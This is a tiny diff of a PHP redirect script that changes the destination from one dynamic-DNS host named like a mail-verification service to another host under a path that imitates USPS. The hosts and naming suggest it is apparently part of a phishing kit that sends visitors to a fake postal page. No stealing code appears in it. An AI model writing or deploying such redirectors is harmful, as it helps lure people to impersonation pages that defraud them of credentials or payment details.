@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://postmailverify.3utilities.com/Verify/"); 
+header("Location: https://nobot.ddns.net/USPS/usa/"); 
   
 exit; 
 ?> 
